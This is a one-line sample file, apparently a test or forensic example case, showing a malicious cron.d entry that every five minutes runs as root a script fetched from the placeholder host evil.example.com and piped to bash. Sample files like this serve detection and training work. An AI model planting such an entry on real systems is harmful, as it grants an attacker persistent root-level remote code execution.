# examples/case-linux/etc/cron.d/evil-persist
*/5 * * * * root curl http://evil.example.com/stage.sh | bash
